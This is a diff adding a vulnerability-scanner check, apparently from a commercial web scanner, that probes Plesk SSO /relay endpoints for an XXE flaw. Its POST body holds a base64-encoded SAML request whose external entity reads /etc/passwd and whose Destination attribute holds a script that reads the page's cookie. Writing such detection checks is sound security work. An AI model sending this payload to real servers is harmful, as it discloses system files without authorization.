@@ -1,0 +1,75 @@
+#include helpers.inc;
+#include classMatches.inc;
+// **************************************************************************************							 
+function alert(fname, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(lastJob);	
+	
+	if (matchedText) 
+		ri.Details =  ri.Details + "[break]Pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";	
+	
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************							 
+function request(url)
+{
+	lastJob = new THTTPJob();
+		
+	lastJob.url = new TURL(url);
+	lastJob.addCookies = false;
+	lastJob.verb = 'POST';
+	lastJob.secure = true;
+	lastJob.timeout = 10000;
+	lastJob.retries = 0;
+	lastJob.request.body = 'SAMLRequest=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI%2FPjwhRE9DVFlQRSBkb2MgWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdID4KPHNhbWxwOkF1dGhuUmVxdWVzdCB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iZGZmNTc4YzMwNDlmNWJhMTAyMjNkZjgyMDEyM2ZjY2NiYzEzNGU3NTIwIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxNC0wNS0wOFQxMTo1ODozM1oiIERlc3RpbmF0aW9uPSJqYXZhc2NyaXB0OnByb21wdChkb2N1bWVudC5kb21haW4sZG9jdW1lbnQuY29va2llKSI%2BIDxzYW1sOklzc3Vlcj4meHhlOzwvc2FtbDpJc3N1ZXI%2BIDxzYW1scDpFeHRlbnNpb25zPiA8VUk%2BPFVSTD4meHhlOzwvVVJMPjwvVUk%2BIDwvc2FtbHA6RXh0ZW5zaW9ucz4gPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BIDxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BIDxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjcnNhLXNoYTEiLz4gPGRzOlJlZmVyZW5jZSBVUkk9IiNkZmY1NzhjMzA0OWY1YmExMDIyM2RmODIwMTIzZmNjY2JjMTM0ZTc1MjAiPjxkczpUcmFuc2Zvcm1zPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPjVCV2l5WDl6dkFDR1I1eStOQjJ3eHVYSnRKRT08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BUzRMaENVT0IweWxUNGNqWFVWQWJudnJCakJCenliYXh2V0hUR3c5Sm5Sc3lVQjFNZXRSSytWSHZWL00zUTROWDBER1VORlhsQ1pSM3NNMm1zUU9BaGJqWnhrS1FDTlVCaWc1Ni8wM3Bnc1hscFdKRmhuQkw4bTBzUlJaQmR1ZjRRZEhuL2h4eHl2QUt6YWRQUTVubUlQbUNQcE8xQ1FzUlVUTXJ0LzEzVklFPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BIDwvZHM6U2lnbmF0dXJlPjwvc2FtbHA6QXV0aG5SZXF1ZXN0Pg%3D%3D&response_url=http%3A%2F%2Fhax&RelayState=aHR0cHM6Ly9uczM2NTMyOS5vdmgubmV0Ojg0NDMv&RefererScheme=https&RefererHost=https%3A%2F%2FX.com%3A8443&RefererPort=8443';
+	lastJob.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	lastJob.execute();	
+	if (!lastJob.wasError)
+	{
+		return true;
+	}	
+	
+	return false;
+}
+// **************************************************************************************
+function TestForPleskXXE()
+{
+	var urls = [	
+					"https://" + scanHost + ":8443/relay",				
+					"https://" + scanHost + ":11443/relay"
+				];
+	
+	matches.plainArray = [
+						'No SP with id=root:'
+					  ];
+	
+	matches.regexArray = [
+					  ];	
+	
+	for (var i=0;i<urls.length;i++)
+	{ 	
+		//trace(urls[i]);
+		if (request(urls[i]))
+		{
+			//trace(lastJob.response.body);		
+			var matchedText = matches.searchOnText(lastJob.response.body);	
+			if (matchedText)
+				alert("Plesk_SSO_XXE.xml", matchedText); 	
+		}
+	}
+}
+// **************************************************************************************	
+function startTesting()
+{
+	TestForPleskXXE();
+}
+/***********************************************************************************/
+/* main entry point */
+var matches = new classMatches();
+var lastJob = null;
+startTesting();
